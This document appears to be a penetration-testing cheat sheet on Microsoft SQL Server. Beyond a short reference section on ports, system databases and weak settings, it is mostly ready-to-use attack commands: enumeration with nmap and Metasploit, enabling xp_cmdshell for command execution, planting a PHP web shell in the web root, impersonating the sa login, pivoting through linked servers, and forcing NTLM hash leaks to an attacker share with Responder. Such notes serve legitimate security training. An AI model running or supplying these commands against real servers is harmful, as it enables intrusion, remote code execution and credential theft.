+++
title = "Win: MSSQL"
+++

- `TCP/UDP 1433`: normal
- `TCP 2433`: hidden mode
- default system schemas/databases:
    - `master` - keeps the information for an instance of SQL Server.
    - `msdb` - used by SQL Server Agent.
    - `model` - a template database copied for each new database.
    - `resource` - a read-only database that keeps system objects visible in every database on the server in sys schema.
    - `tempdb` - keeps temporary objects for SQL queries.
- `xp_cmdshell`:
    - `xp_cmdshell` is a powerful feature and disabled by default. It can be enabled and disabled by using the Policy-Based Management or by executing `sp_configure`
    - The Windows process spawned by `xp_cmdshell` has the same security rights as the SQL Server service account
    - `xp_cmdshell` operates synchronously. Control is not returned to the caller until the command-shell command is completed

Microsoft's closed-source version of SQL.

- https://www.microsoft.com/en-us/sql-server/sql-server-2019
- https://learn.microsoft.com/en-us/ssms/install/install?view=sql-server-ver15
- https://learn.microsoft.com/en-us/sql/relational-databases/databases/system-databases?view=sql-server-ver15
- https://learn.microsoft.com/en-us/sql/tools/configuration-manager/named-pipes-properties?view=sql-server-ver15

{{% details "Dangerous Settings" %}}

- MSSQL clients not using encryption to connect to the MSSQL server
- The use of self-signed certificates when encryption is being used. It is possible to spoof self-signed certificates
- The use of [named pipes](https://docs.microsoft.com/en-us/sql/tools/configuration-manager/named-pipes-properties?view=sql-server-ver15)
- Weak & default `sa` credentials. Admins may forget to disable this account

{{% /details %}}

```bash
# Enumerate via nmap
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <TARGET>

# Enumerate via MSF
use auxiliary/scanner/mssql/mssql_ping
set RHOSTS <TARGET>
run

### Login via Windows auth
impacket-mssqlclient -windows-auth <DOMAIN>/<USER>@<TARGET>
impacket-mssqlclient <USER>:<PASSWORD>@<TARGET>

SELECT @@version;
SELECT user_name();
SELECT system_user;
SELECT IS_SRVROLEMEMBER('sysadmin');  -- 1+ is admin
# Users
SELECT name FROM master..syslogins;
# Databases
SELECT name FROM master..sysdatabases;

# show tables ;
USE <DATABASE> ;
SELECT name FROM sys.tables;

---

### Read Files
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents

### Write Files (to achieve command execution)
sp_configure 'show advanced options', 1
RECONFIGURE
sp_configure 'Ole Automation Procedures', 1
RECONFIGURE

DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE

### Enable xp_cmdshell
EXECUTE sp_configure 'show advanced options', 1
RECONFIGURE
EXECUTE sp_configure 'xp_cmdshell', 1
RECONFIGURE

xp_cmdshell 'whoami'

# or run linked server command
EXECUTE('xp_cmdshell ''<DOS_CMD>''') AT [<LINKED_SERVER>]

### Impersonate User
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE' ;
GO

# Impersonating the SA User
USE master
EXECUTE AS LOGIN = 'sa'
# Verify
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
# 0 is NOT admin

### Linked Servers
SELECT srvname, isremote FROM sysservers
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [<TARGET>\SQLEXPRESS]

---

### Capture NTLM Hash
sudo responder -I <INTERFACE>

# XP_DIRTREE Hash Stealing
EXEC master..xp_dirtree '\\<ATTACKER>\share'
# XP_SUBDIRS Hash Stealing
EXEC master..xp_subdirs '\\<ATTACKER>\share'
```
